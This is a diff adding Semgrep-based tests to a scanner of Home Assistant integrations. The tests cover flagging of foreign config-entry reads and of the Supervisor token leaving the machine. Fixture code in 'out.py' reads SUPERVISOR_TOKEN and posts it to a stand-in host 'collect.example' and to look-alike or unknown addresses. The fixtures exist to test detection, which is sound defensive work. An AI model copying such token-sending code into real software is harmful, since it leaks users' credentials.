@@ -724,3 +724,118 @@ def test_credential_text_and_presence_checks_are_no_finding(tmp_path):
     assert _hits(result, "ha-read-auth-storage") == [18]
     # three presence checks go; keeping the token and sending it stay
     assert sorted(set(_hits(result, "ha-supervisor-token"))) == [14, 15]
+
+
+# --- (0.15) his report: an own-domain constant read through a module alias --------------
+
+ALIASED_DOMAIN = {
+    "const.py": 'DOMAIN = "acme_power"\n',
+    "other.py": 'DOMAIN = "tplink"\n',
+    "__init__.py": """\
+        from . import const as ac
+        from . import other as ot
+        from . import const as moved
+
+        moved = ot
+
+
+        def own(hass):
+            for entry in hass.config_entries.async_entries(ac.DOMAIN):
+                print(entry.data)
+            for entry in hass.config_entries.async_entries(ot.DOMAIN):
+                print(entry.data)
+            for entry in hass.config_entries.async_entries(moved.DOMAIN):
+                print(entry.data)
+        """,
+}
+
+
+@needs_semgrep
+def test_a_domain_read_through_an_own_module_alias_is_its_own(tmp_path):
+    result, _ = _run(tmp_path, ALIASED_DOMAIN)
+    # `ac.DOMAIN` is the app's own; another domain in an own module, and an alias the
+    # file assigns again, both stay
+    assert _hits(result, "ha-foreign-entry-data") == [12, 14]
+
+
+# --- (0.15) his report: the Supervisor's key sent to the Supervisor on the same box ------
+
+TO_SUPERVISOR = {
+    "__init__.py": """\
+        import os
+
+        HOST = "http://supervisor"
+
+
+        async def addons(session):
+            token = os.environ.get("SUPERVISOR_TOKEN")
+            async with session.get(
+                "http://supervisor/addons",
+                headers={"Authorization": f"Bearer {token}"},
+            ) as resp:
+                return await resp.json()
+
+
+        async def info(session):
+            token = os.environ.get("SUPERVISOR_TOKEN")
+            return await session.get(f"{HOST}/info", headers={"Authorization": token})
+        """,
+    "out.py": """\
+        import os
+
+
+        async def lookalike(session):
+            token = os.environ.get("SUPERVISOR_TOKEN")
+            return await session.get(
+                "http://supervisor.example/addons", headers={"Authorization": token}
+            )
+
+
+        async def unknown(session, where):
+            token = os.environ.get("SUPERVISOR_TOKEN")
+            return await session.post(where, headers={"Authorization": token})
+
+
+        async def elsewhere(session):
+            token = os.environ.get("SUPERVISOR_TOKEN")
+            return await session.post("https://collect.example/x", json={"t": token})
+
+
+        async def kept(session, keep):
+            token = os.environ.get("SUPERVISOR_TOKEN")
+            keep(token)
+            return await session.get("http://supervisor/info", headers={"Authorization": token})
+        """,
+}
+
+
+@needs_semgrep
+def test_the_supervisor_key_sent_to_the_supervisor_is_not_off_box(tmp_path):
+    result, _ = _run(tmp_path, TO_SUPERVISOR)
+    by_file = {
+        name: sorted({f.line for f in result.findings
+                      if f.rule_id == "ha-exfil-taint" and f.file == name})
+        for name in ("__init__.py", "out.py")
+    }  # fmt: skip
+    assert by_file["__init__.py"] == []  # the literal address and the resolved constant
+    # a look-alike host, an address Barkley can't resolve, and another site all stay
+    assert len(by_file["out.py"]) == 3
+    # the key that only goes to the Supervisor is its own, calmer item; the others stay
+    local = [f for f in result.findings if f.rule_id == "ha-supervisor-token-local"]
+    assert sorted({(f.file, f.line) for f in local}) == [("__init__.py", 7), ("__init__.py", 16)]
+    assert all("Supervisor on this box (http://supervisor/" in f.message for f in local)
+    kept = sorted({(f.file, f.line) for f in result.findings
+                   if f.rule_id == "ha-supervisor-token"})  # fmt: skip
+    assert kept == [("out.py", 5), ("out.py", 12), ("out.py", 17), ("out.py", 22)]
+    # no "possible" threat from a key that never leaves the box
+    facts = [
+        Fact(Ring.NETWORK, "host", "collect.example", "connects_to", Evidence.POSSIBLE,
+             attrs={"class": "undeclared"}),
+        Fact(Ring.NETWORK, "http_client", "aiohttp", "uses", Evidence.POSSIBLE,
+             file="__init__.py", attrs={"outbound": True}),
+    ]  # fmt: skip
+    only = [f for f in result.findings if f.file == "__init__.py"]
+    assert correlate.correlate(only, facts, tmp_path) == []
+    away = [f for f in result.findings if f.file == "out.py"
+            and f.rule_id == "ha-supervisor-token" and f.line == 22]  # fmt: skip
+    assert [f.rule_id for f in correlate.correlate(away, facts, tmp_path)] == ["possible-exfil"]
